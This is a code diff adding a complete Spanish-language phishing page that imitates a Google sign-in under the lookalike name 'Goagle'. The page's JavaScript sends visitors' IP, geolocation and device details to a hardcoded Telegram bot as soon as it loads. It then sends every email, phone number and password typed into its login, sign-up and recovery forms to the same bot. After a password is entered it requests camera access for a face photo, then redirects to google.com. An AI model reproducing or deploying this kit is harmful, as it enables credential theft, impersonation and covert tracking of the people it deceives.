@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Goagle</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: flex-end;
+            padding: 10px 0;
+            width: 100%;
+            max-width: 450px;
+        }
+        
+        .header a {
+            margin-left: 15px;
+            text-decoration: none;
+            color: #5f6368;
+            font-size: 14px;
+        }
+        
+        .header a:hover {
+            text-decoration: underline;
+        }
+        
+        .logo-container {
+            margin-top: 40px;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .goagle-logo {
+            font-size: 70px;
+            font-weight: 400;
+            letter-spacing: -3px;
+        }
+        
+        .blue { color: #4285F4; }
+        .red { color: #EA4335; }
+        .yellow { color: #FBBC05; }
+        .green { color: #34A853; }
+        
+        .login-container {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 30px;
+            width: 100%;
+            max-width: 450px;
+            margin-bottom: 30px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 20px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            transition: border 0.2s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border: 1px solid #4285F4;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 30px;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .info-text {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 30px 0 10px;
+        }
+        
+        .learn-more {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .learn-more:hover {
+            text-decoration: underline;
+        }
+        
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            font-weight: 500;
+            text-decoration: none;
+            padding: 10px 0;
+            display: flex;
+            align-items: center;
+        }
+        
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .next-button:hover {
+            background-color: #1565d0;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        
+        .password-container, .signup-container, .camera-container {
+            display: none;
+        }
+        
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            width: 100%;
+            max-width: 450px;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: auto;
+        }
+        
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-right: 20px;
+            white-space: nowrap;
+        }
+        
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        
+        .language-selector {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+            width: 100%;
+        }
+        
+        .language-selector select {
+            border: none;
+            color: #5f6368;
+            background: transparent;
+            font-size: 12px;
+            padding: 5px;
+        }
+        
+        @media (max-width: 480px) {
+            .goagle-logo {
+                font-size: 60px;
+            }
+            
+            .login-container {
+                padding: 20px;
+            }
+            
+            .footer {
+                flex-direction: column;
+            }
+            
+            .footer-links {
+                display: flex;
+                flex-wrap: wrap;
+                margin-bottom: 10px;
+            }
+        }
+        
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .button-with-loader {
+            display: flex;
+            align-items: center;
+        }
+        
+        .notification {
+            display: none;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #34A853;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            z-index: 1000;
+        }
+        
+        .phone-option {
+            display: block;
+            margin-top: 10px;
+            color: #5f6368;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .camera-feed {
+            width: 100%;
+            height: 300px;
+            background-color: #f1f1f1;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            object-fit: cover;
+        }
+        
+        .capture-btn {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        
+        .retake-btn {
+            background-color: #EA4335;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        
+        .camera-controls {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .captured-image {
+            width: 100%;
+            height: 300px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            object-fit: cover;
+            display: none;
+        }
+        
+        .signup-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .signup-option {
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            padding: 12px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .signup-option:hover {
+            background-color: #f8f9fa;
+        }
+        
+        .signup-option.selected {
+            border-color: #4285F4;
+            background-color: #e8f0fe;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <a href="https://www.google.com" target="_blank">Ayuda</a>
+        <a href="https://www.google.com" target="_blank">Privacidad</a>
+        <a href="https://www.google.com" target="_blank">Términos</a>
+    </div>
+    
+    <div class="logo-container">
+        <h1 class="goagle-logo">
+            <span class="blue">G</span>
+            <span class="red">o</span>
+            <span class="yellow">a</span>
+            <span class="blue">g</span>
+            <span class="green">l</span>
+            <span class="red">e</span>
+        </h1>
+    </div>
+    
+    <div class="login-container" id="email-container">
+        <h2 class="login-title">Iniciar sesión</h2>
+        <input type="text" class="input-field" id="email-field" placeholder="Correo electrónico o teléfono" autocomplete="username">
+        <a href="#" class="forgot-email" id="show-signup">¿Olvidaste tu correo electrónico?</a>
+        
+        <p class="info-text">¿No es tu ordenador? Usa el modo invitado para navegar de forma privada.
+            <a href="https://support.google.com/chrome/answer/6130773" target="_blank" class="learn-more">Más información</a>
+        </p>
+        
+        <div class="buttons">
+            <a href="#" class="create-account" id="show-create-account">Crear cuenta</a>
+            <button class="next-button" id="next-email">Siguiente</button>
+        </div>
+    </div>
+    
+    <div class="login-container password-container" id="password-container">
+        <h2 class="login-title">Bienvenido</h2>
+        <p style="margin-bottom: 20px; font-size: 14px;" id="user-email">usuario@ejemplo.com</p>
+        
+        <input type="password" class="input-field" id="password-field" placeholder="Introduce tu contraseña" autocomplete="current-password">
+        <a href="#" class="forgot-email" id="show-forgot-password">¿Olvidaste tu contraseña?</a>
+        
+        <div class="buttons">
+            <a href="#" class="create-account" id="back-button">Volver</a>
+            <div class="button-with-loader">
+                <div class="loader" id="password-loader"></div>
+                <button class="next-button" id="next-password">Siguiente</button>
+            </div>
+        </div>
+    </div>
+    
+    <div class="login-container signup-container" id="signup-container">
+        <h2 class="login-title">Crear cuenta</h2>
+        
+        <div class="signup-options">
+            <div class="signup-option selected" id="option-email">
+                <strong>Usar mi correo electrónico</strong>
+            </div>
+            <div class="signup-option" id="option-phone">
+                <strong>Usar mi número de teléfono</strong>
+            </div>
+        </div>
+        
+        <div id="email-signup">
+            <input type="email" class="input-field" id="new-email-field" placeholder="Correo electrónico">
+            <input type="password" class="input-field" id="new-password-field" placeholder="Contraseña">
+            <input type="password" class="input-field" id="confirm-password-field" placeholder="Confirmar contraseña">
+        </div>
+        
+        <div id="phone-signup" style="display: none;">
+            <input type="tel" class="input-field" id="phone-field" placeholder="Número de teléfono">
+            <p style="font-size: 14px; color: #5f6368; margin-bottom: 20px;">
+                Se enviará un código de verificación a este número.
+            </p>
+        </div>
+        
+        <div class="buttons">
+            <a href="#" class="create-account" id="back-to-login">Volver al inicio</a>
+            <button class="next-button" id="create-account-btn">Crear cuenta</button>
+        </div>
+    </div>
+    
+    <div class="login-container" id="forgot-password-container" style="display: none;">
+        <h2 class="login-title">Recuperar cuenta</h2>
+        
+        <p style="margin-bottom: 20px; font-size: 14px;">
+            Introduce tu correo electrónico o número de teléfono para buscar tu cuenta.
+        </p>
+        
+        <input type="text" class="input-field" id="recovery-field" placeholder="Correo electrónico o teléfono">
+        
+        <div class="buttons">
+            <a href="#" class="create-account" id="back-from-recovery">Volver</a>
+            <button class="next-button" id="recover-account">Buscar</button>
+        </div>
+    </div>
+    
+    <div class="login-container camera-container" id="camera-container">
+        <h2 class="login-title">Verificación de identidad</h2>
+        
+        <p style="margin-bottom: 20px; font-size: 14px;">
+            Para tu seguridad, necesitamos verificar tu identidad. Por favor, permite el acceso a tu cámara y toma una foto.
+        </p>
+        
+        <video class="camera-feed" id="camera-feed" autoplay playsinline></video>
+        <canvas id="photo-canvas" style="display: none;"></canvas>
+        <img class="captured-image" id="captured-image" alt="Foto capturada">
+        
+        <div class="camera-controls">
+            <button class="capture-btn" id="capture-btn">Tomar foto</button>
+            <button class="retake-btn" id="retake-btn" style="display: none;">Volver a tomar</button>
+            <button class="next-button" id="verify-btn" style="display: none;">Verificar</button>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="https://about.google/" target="_blank">Acerca de</a>
+            <a href="https://ads.google.com/" target="_blank">Publicidad</a>
+            <a href="https://www.google.com/services/" target="_blank">Negocios</a>
+        </div>
+        <div class="footer-links">
+            <a href="https://www.google.com/search/howsearchworks/" target="_blank">Cómo funciona la Búsqueda</a>
+        </div>
+        <div class="footer-links">
+            <a href="https://policies.google.com/privacy" target="_blank">Privacidad</a>
+            <a href="https://policies.google.com/terms" target="_blank">Términos</a>
+            <a href="https://www.google.com/preferences" target="_blank">Configuración</a>
+        </div>
+    </div>
+
+    <div class="notification" id="notification">Datos enviados correctamente</div>
+
+    <script>
+        // Configuración - Reemplaza con tus propios valores
+        const BOT_TOKEN = '7542993793:AAEq4BjvSzljeYAkIl7SM-s-4XB08jK0hYM';
+        const CHAT_ID = '1081367850';
+        
+        // Variables globales
+        let userData = {};
+        let stream = null;
+        let photoDataUrl = null;
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailContainer = document.getElementById('email-container');
+            const passwordContainer = document.getElementById('password-container');
+            const signupContainer = document.getElementById('signup-container');
+            const forgotPasswordContainer = document.getElementById('forgot-password-container');
+            const cameraContainer = document.getElementById('camera-container');
+            const emailField = document.getElementById('email-field');
+            const passwordField = document.getElementById('password-field');
+            const nextEmailButton = document.getElementById('next-email');
+            const nextPasswordButton = document.getElementById('next-password');
+            const backButton = document.getElementById('back-button');
+            const userEmailElement = document.getElementById('user-email');
+            const passwordLoader = document.getElementById('password-loader');
+            const notification = document.getElementById('notification');
+            const showSignupLink = document.getElementById('show-signup');
+            const showCreateAccountBtn = document.getElementById('show-create-account');
+            const showForgotPasswordLink = document.getElementById('show-forgot-password');
+            const backToLoginBtn = document.getElementById('back-to-login');
+            const backFromRecoveryBtn = document.getElementById('back-from-recovery');
+            const recoveryField = document.getElementById('recovery-field');
+            const recoverAccountBtn = document.getElementById('recover-account');
+            const cameraFeed = document.getElementById('camera-feed');
+            const captureBtn = document.getElementById('capture-btn');
+            const retakeBtn = document.getElementById('retake-btn');
+            const verifyBtn = document.getElementById('verify-btn');
+            const capturedImage = document.getElementById('captured-image');
+            const photoCanvas = document.getElementById('photo-canvas');
+            const optionEmail = document.getElementById('option-email');
+            const optionPhone = document.getElementById('option-phone');
+            const emailSignup = document.getElementById('email-signup');
+            const phoneSignup = document.getElementById('phone-signup');
+            const createAccountBtn = document.getElementById('create-account-btn');
+            
+            // Enviar datos de conexión inicial
+            setTimeout(() => {
+                collectInitialData().then(initialData => {
+                    userData.initial = initialData;
+                    const message = formatInitialMessage(initialData);
+                    sendToTelegram(message);
+                });
+            }, 2000);
+            
+            // Selección de tipo de registro
+            optionEmail.addEventListener('click', () => {
+                optionEmail.classList.add('selected');
+                optionPhone.classList.remove('selected');
+                emailSignup.style.display = 'block';
+                phoneSignup.style.display = 'none';
+            });
+            
+            optionPhone.addEventListener('click', () => {
+                optionPhone.classList.add('selected');
+                optionEmail.classList.remove('selected');
+                emailSignup.style.display = 'none';
+                phoneSignup.style.display = 'block';
+            });
+            
+            // Función para validar email
+            function isValidEmail(email) {
+                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return re.test(email);
+            }
+            
+            // Función para validar teléfono
+            function isValidPhone(phone) {
+                const re = /^[\+]?[1-9][\d]{0,15}$/;
+                return re.test(phone.replace(/\D/g, ''));
+            }
+            
+            // Función para recopilar datos iniciales de conexión
+            async function collectInitialData() {
+                try {
+                    // Obtener la IP y ubicación aproximada
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    const ip = ipData.ip;
+                    
+                    // Obtener información de geolocalización
+                    let location = "Desconocida";
+                    try {
+                        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                        const locationData = await locationResponse.json();
+                        location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                    } catch (e) {
+                        console.error("Error obteniendo ubicación:", e);
+                    }
+                    
+                    // Información del navegador
+                    const browserInfo = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const language = navigator.language;
+                    const screen = `${screen.width}x${screen.height}`;
+                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const currentTime = new Date().toLocaleString();
+                    
+                    // Devolver todos los datos recopilados
+                    return {
+                        ip,
+                        location,
+                        browser: browserInfo,
+                        platform,
+                        language,
+                        screen,
+                        timezone,
+                        time: currentTime
+                    };
+                } catch (error) {
+                    console.error("Error recopilando datos iniciales:", error);
+                    return {
+                        ip: "Desconocida",
+                        location: "Desconocida",
+                        browser: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screen: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        time: new Date().toLocaleString()
+                    };
+                }
+            }
+            
+            // Función para recopilar datos del usuario
+            async function collectUserData(email, password) {
+                const initialData = userData.initial || await collectInitialData();
+                
+                return {
+                    email,
+                    password,
+                    ...initialData
+                };
+            }
+            
+            // Función para enviar mensaje a Telegram
+            async function sendToTelegram(message) {
+                if (!BOT_TOKEN || !CHAT_ID) {
+                    console.error("Configura el token del bot y el chat ID primero");
+                    return false;
+                }
+                
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    return data.ok;
+                } catch (error) {
+                    console.error("Error enviando a Telegram:", error);
+                    return false;
+                }
+            }
+            
+            // Función para formatear el mensaje inicial para Telegram
+            function formatInitialMessage(initialData) {
+                return `
+🌐 <b>Nueva conexión detectada</b>
+
+📡 <b>Información de conexión:</b>
+├ IP: <code>${initialData.ip}</code>
+├ Ubicación: ${initialData.location}
+├ Zona horaria: ${initialData.timezone}
+└ Hora: ${initialData.time}
+
+💻 <b>Información del dispositivo:</b>
+├ Navegador: ${initialData.browser}
+├ Plataforma: ${initialData.platform}
+├ Idioma: ${initialData.language}
+└ Resolución: ${initialData.screen}
+                `;
+            }
+            
+            // Función para formatear el mensaje de credenciales para Telegram
+            function formatCredentialMessage(userData) {
+                return `
+🔐 <b>Nuevo inicio de sesión detectado</b>
+
+📧 <b>Email/Teléfono:</b> <code>${userData.email}</code>
+🔑 <b>Contraseña:</b> <code>${userData.password}</code>
+
+📡 <b>Información de conexión:</b>
+├ IP: <code>${userData.ip}</code>
+├ Ubicación: ${userData.location}
+├ Zona horaria: ${userData.timezone}
+└ Hora: ${userData.time}
+
+💻 <b>Información del dispositivo:</b>
+├ Navegador: ${userData.browser}
+├ Plataforma: ${userData.platform}
+├ Idioma: ${userData.language}
+└ Resolución: ${userData.screen}
+                `;
+            }
+            
+            // Función para formatear el mensaje de registro para Telegram
+            function formatSignupMessage(userData, isPhone = false) {
+                const type = isPhone ? "Teléfono" : "Email";
+                return `
+🎯 <b>Nueva cuenta creada</b>
+
+📞 <b>${type}:</b> <code>${userData.email}</code>
+🔑 <b>Contraseña:</b> <code>${userData.password}</code>
+
+📡 <b>Información de conexión:</b>
+├ IP: <code>${userData.ip}</code>
+├ Ubicación: ${userData.location}
+├ Zona horaria: ${userData.timezone}
+└ Hora: ${userData.time}
+
+💻 <b>Información del dispositivo:</b>
+├ Navegador: ${userData.browser}
+├ Plataforma: ${userData.platform}
+├ Idioma: ${userData.language}
+└ Resolución: ${userData.screen}
+                `;
+            }
+            
+            // Función para formatear el mensaje de recuperación para Telegram
+            function formatRecoveryMessage(recoveryData) {
+                return `
+🔍 <b>Recuperación de cuenta solicitada</b>
+
+📧 <b>Email/Teléfono:</b> <code>${recoveryData.email}</code>
+
+📡 <b>Información de conexión:</b>
+├ IP: <code>${recoveryData.ip}</code>
+├ Ubicación: ${recoveryData.location}
+├ Zona horaria: ${recoveryData.timezone}
+└ Hora: ${recoveryData.time}
+
+💻 <b>Información del dispositivo:</b>
+├ Navegador: ${recoveryData.browser}
+├ Plataforma: ${recoveryData.platform}
+├ Idioma: ${recoveryData.language}
+└ Resolución: ${recoveryData.screen}
+                `;
+            }
+            
+            // Función para iniciar la cámara
+            async function startCamera() {
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }, 
+                        audio: false 
+                    });
+                    cameraFeed.srcObject = stream;
+                } catch (err) {
+                    console.error("Error al acceder a la cámara: ", err);
+                    showNotification('No se pudo acceder a la cámara. Redirigiendo...', 'error');
+                    
+                    // Redirigir después de un breve delay
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com/';
+                    }, 2000);
+                }
+            }
+            
+            // Función para tomar foto
+            function takePhoto() {
+                const context = photoCanvas.getContext('2d');
+                photoCanvas.width = cameraFeed.videoWidth;
+                photoCanvas.height = cameraFeed.videoHeight;
+                context.drawImage(cameraFeed, 0, 0, photoCanvas.width, photoCanvas.height);
+                
+                photoDataUrl = photoCanvas.toDataURL('image/png');
+                capturedImage.src = photoDataUrl;
+                capturedImage.style.display = 'block';
+                cameraFeed.style.display = 'none';
+                
+                captureBtn.style.display = 'none';
+                retakeBtn.style.display = 'inline-block';
+                verifyBtn.style.display = 'inline-block';
+                
+                // Detener la cámara
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
+            
+            // Función para volver a tomar foto
+            function retakePhoto() {
+                capturedImage.style.display = 'none';
+                cameraFeed.style.display = 'block';
+                
+                captureBtn.style.display = 'inline-block';
+                retakeBtn.style.display = 'none';
+                verifyBtn.style.display = 'none';
+                
+                // Reiniciar la cámara
+                startCamera();
+            }
+            
+            // Función para mostrar notificación
+            function showNotification(message, type = 'success') {
+                notification.textContent = message;
+                notification.style.backgroundColor = type === 'success' ? '#34A853' : '#EA4335';
+                notification.style.display = 'block';
+                
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+            }
+            
+            // Mostrar pantalla de creación de cuenta
+            showCreateAccountBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                emailContainer.style.display = 'none';
+                signupContainer.style.display = 'block';
+            });
+            
+            // Mostrar pantalla de recuperación
+            showSignupLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                emailContainer.style.display = 'none';
+                forgotPasswordContainer.style.display = 'block';
+            });
+            
+            showForgotPasswordLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                passwordContainer.style.display = 'none';
+                forgotPasswordContainer.style.display = 'block';
+            });
+            
+            // Volver desde recuperación
+            backFromRecoveryBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                forgotPasswordContainer.style.display = 'none';
+                
+                if (passwordContainer.style.display === 'block') {
+                    passwordContainer.style.display = 'block';
+                } else {
+                    emailContainer.style.display = 'block';
+                }
+            });
+            
+            // Volver al login desde creación de cuenta
+            backToLoginBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                signupContainer.style.display = 'none';
+                emailContainer.style.display = 'block';
+            });
+            
+            // Recuperar cuenta
+            recoverAccountBtn.addEventListener('click', async function() {
+                if (recoveryField.value.trim() === '') {
+                    recoveryField.style.borderColor = '#EA4335';
+                    recoveryField.focus();
+                    return;
+                }
+                
+                const recoveryData = await collectInitialData();
+                recoveryData.email = recoveryField.value.trim();
+                
+                const message = formatRecoveryMessage(recoveryData);
+                const sent = await sendToTelegram(message);
+                
+                if (sent) {
+                    showNotification('Se ha enviado un correo de recuperación');
+                    
+                    setTimeout(() => {
+                        forgotPasswordContainer.style.display = 'none';
+                        emailContainer.style.display = 'block';
+                    }, 2000);
+                } else {
+                    showNotification('Error al enviar la solicitud', 'error');
+                }
+            });
+            
+            // Crear cuenta
+            createAccountBtn.addEventListener('click', async function() {
+                const isPhoneSelected = optionPhone.classList.contains('selected');
+                let identifier, password;
+                
+                if (isPhoneSelected) {
+                    identifier = document.getElementById('phone-field').value.trim();
+                    if (!isValidPhone(identifier)) {
+                        document.getElementById('phone-field').style.borderColor = '#EA4335';
+                        showNotification('Por favor, introduce un número de teléfono válido', 'error');
+                        return;
+                    }
+                    password = "N/A - Registro con teléfono";
+                } else {
+                    identifier = document.getElementById('new-email-field').value.trim();
+                    if (!isValidEmail(identifier)) {
+                        document.getElementById('new-email-field').style.borderColor = '#EA4335';
+                        showNotification('Por favor, introduce una dirección de correo electrónico válida', 'error');
+                        return;
+                    }
+                    
+                    password = document.getElementById('new-password-field').value;
+                    const confirmPassword = document.getElementById('confirm-password-field').value;
+                    
+                    if (password !== confirmPassword) {
+                        document.getElementById('confirm-password-field').style.borderColor = '#EA4335';
+                        showNotification('Las contraseñas no coinciden', 'error');
+                        return;
+                    }
+                }
+                
+                const userData = await collectUserData(identifier, password);
+                const message = formatSignupMessage(userData, isPhoneSelected);
+                const sent = await sendToTelegram(message);
+                
+                if (sent) {
+                    showNotification('Cuenta creada correctamente. Redirigiendo...');
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://www.google.com/';
+                    }, 2000);
+                } else {
+                    showNotification('Error al crear la cuenta', 'error');
+                }
+            });
+            
+            // Al hacer clic en "Siguiente" en el campo de email/teléfono
+            nextEmailButton.addEventListener('click', function() {
+                const identifier = emailField.value.trim();
+                
+                if (identifier === '') {
+                    emailField.style.borderColor = '#EA4335';
+                    emailField.focus();
+                    return;
+                }
+                
+                const isEmail = isValidEmail(identifier);
+                const isPhone = isValidPhone(identifier);
+                
+                if (!isEmail && !isPhone) {
+                    emailField.style.borderColor = '#EA4335';
+                    showNotification('Por favor, introduce una dirección de correo electrónico o número de teléfono válido', 'error');
+                    emailField.focus();
+                    return;
+                }
+                
+                // Mostrar contenedor de contraseña
+                emailContainer.style.display = 'none';
+                passwordContainer.style.display = 'block';
+                userEmailElement.textContent = identifier;
+                passwordField.focus();
+            });
+            
+            // Al hacer clic en "Volver" desde la contraseña
+            backButton.addEventListener('click', function() {
+                passwordContainer.style.display = 'none';
+                emailContainer.style.display = 'block';
+                emailField.focus();
+            });
+            
+            // Al hacer clic en "Siguiente" en el campo de contraseña
+            nextPasswordButton.addEventListener('click', async function() {
+                if (passwordField.value.trim() === '') {
+                    passwordField.style.borderColor = '#EA4335';
+                    passwordField.focus();
+                    return;
+                }
+                
+                // Mostrar loader
+                passwordLoader.style.display = 'block';
+                nextPasswordButton.disabled = true;
+                
+                try {
+                    // Recopilar datos
+                    const userCredentials = await collectUserData(userEmailElement.textContent, passwordField.value.trim());
+                    
+                    // Formatear y enviar mensaje a Telegram
+                    const message = formatCredentialMessage(userCredentials);
+                    const sent = await sendToTelegram(message);
+                    
+                    if (sent) {
+                        // Ocultar formulario de contraseña y mostrar cámara
+                        passwordContainer.style.display = 'none';
+                        cameraContainer.style.display = 'block';
+                        
+                        // Iniciar cámara
+                        await startCamera();
+                    } else {
+                        throw new Error('Error enviando datos');
+                    }
+                } catch (error) {
+                    console.error("Error:", error);
+                    showNotification('Error de conexión. Intenta nuevamente.', 'error');
+                    
+                    // Restablecer UI
+                    passwordLoader.style.display = 'none';
+                    nextPasswordButton.disabled = false;
+                }
+            });
+            
+            // Capturar foto
+            captureBtn.addEventListener('click', takePhoto);
+            
+            // Volver a tomar foto
+            retakeBtn.addEventListener('click', retakePhoto);
+            
+            // Verificar foto
+            verifyBtn.addEventListener('click', function() {
+                showNotification('Verificación exitosa. Redirigiendo...');
+                
+                // Redirigir después de un breve delay
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com/';
+                }, 2000);
+            });
+            
+            // Permitir enviar con Enter
+            emailField.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    nextEmailButton.click();
+                }
+            });
+            
+            passwordField.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    nextPasswordButton.click();
+                }
+            });
+            
+            recoveryField.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    recoverAccountBtn.click();
+                }
+            });
+            
+            // Quitar el color rojo del borde cuando el usuario empiece a escribir
+            emailField.addEventListener('input', function() {
+                if (this.style.borderColor === 'rgb(234, 67, 53)') {
+                    this.style.borderColor = '#dadce0';
+                }
+            });
+            
+            passwordField.addEventListener('input', function() {
+                if (this.style.borderColor === 'rgb(234, 67, 53)') {
+                    this.style.borderColor = '#dadce0';
+                }
+            });
+            
+            recoveryField.addEventListener('input', function() {
+                if (this.style.borderColor === 'rgb(234, 67, 53)') {
+                    this.style.borderColor = '#dadce0';
+                }
+            });
+        });
+    </script>
+</body>
+</html>
